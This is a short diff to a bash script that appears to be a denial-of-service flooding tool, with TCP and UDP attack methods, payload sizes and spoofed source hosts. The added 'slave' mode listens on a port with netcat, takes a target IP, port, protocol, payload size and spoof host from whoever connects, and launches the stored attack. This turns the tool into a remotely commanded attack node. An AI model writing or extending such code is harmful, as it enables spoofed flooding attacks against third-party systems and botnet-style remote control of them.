@@ -106,6 +106,21 @@ if [ "$1" = "History" ] || [ "$1" = "history" ]; then
     cd ${LAST_DIR}
 fi
 #7:58PM 13/01/2012
+
+if [ "$1" = "slave" ] || [ "$1" = "Slave" ]; then
+    PORT_NUM=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "What port to listen on?" 8 40 111 --stdout`
+    NETCAT=`nc -l ${PORT_NUM} > netcat.temp`
+    DOS_HISTORY_FILE=netcat.temp
+    LAST_IP=`grep -w 'Last_IP:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
+    LAST_PROTOCOL=`grep -w 'Last_Protocol:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
+    LAST_PORT=`grep -w 'Last_Port:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
+    LAST_PAYLOAD_SIZE=`grep -w 'Last_Payload_Size:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
+    LAST_SPOOF_HOST=`grep -w 'Last_Spoof_Host:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
+    func_history
+    rm netcat.temp
+    exit 0
+fi
+
 opt=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --radiolist "What method of attack?" 11 30 4 \
 TCP TCP ${TCP} \
 UDP UDP ${UDP} \
